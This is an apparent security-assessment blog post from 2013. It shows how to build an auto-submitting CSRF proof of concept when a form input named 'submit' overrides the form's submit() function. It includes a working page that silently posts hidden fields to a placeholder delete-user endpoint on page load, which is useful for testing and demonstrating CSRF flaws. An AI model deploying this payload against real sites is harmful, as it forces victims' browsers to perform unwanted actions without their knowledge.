---
title: "Auto submit (onload) a HTML Form with an input field called 'submit' - CSRF PoC"
date: 2013-11-05
categories:
- appsec
tags:
- csrf
- html

thumbnailImagePosition: left
thumbnailImage: /img/auto-submit-a-html-form-with-an-input-field-called-submit---csrf-poc/1.png
---

Creating a auto submit (body onload) form when an input button called submit exists. Very common CSRF exploit PoC.

<!--more-->

This post describes a fairly common scenario I encounter during web application security assessments. Imagine a HTML form with the following code:

```
<form id="myForm" action="http://example.com/deleteuser.php" method="POST" name="myForm">
<input id="val1" name="val1" type="text" value="value1" />
<input id="val2" name="val2" type="text" value="value2" />
<input id="val3" name="val3" type="text" value="value3" />
<input id="submit" name="submit" type="text" value="Continue" />
</form>
```

This form is vulnerable to CSRF due to the lack of a unique token. When I want to build a PoC for CSRF I normally use the `<body onload=formname.submit()` to demonstrate that the form is indeed vulnerable to CSRF and the attack can be stealthily performed using body onload (no user interaction required, apart from page load).

In this case, the presence of an input field whose name and id is `submit` complicates matters. The `submit()` function of the `myForm` is completely overwritten by the input field and a call to `myForm.submit()` would yield a `myForm.submit is not a function` error.

To be able to submit data onload of the body or iframe, we would somehow need to submit the `myForm` without explicitly calling the submit function. The simplest way of doing this would be by converting the input field with name and id `submit` from text / hidden to type `submit`. This will however require a user to click on the button (or use JS to perform the click).

I posted this question on StackOverflow and was not disappointed. As [Quentin answered my query on StackOverflow](http://stackoverflow.com/questions/18937990/javascript-form-submit-with-a-field-called-submit), we need to steal the submit function from another form. So the final CSRF PoC, complete with stealth and auto trigger looks like this:

```
<html>
    <body onload="document.createElement('form').submit.call(document.getElementById('myForm'))">
        <form id="myForm" name="myForm" action="http://example.com/deleteuser.php" method="POST">
            <input type=hidden name="val1" id="val1" value="value1"/>
            <input type=hidden name="val2" id="val2" value="value2"/>
            <input type=hidden name="val3" id="val3" value="value3"/>
            <input type=hidden name="submit" id="submit" value="Continue"/>
        </form>
    </body>
</html>
```

Happy Hacking!

---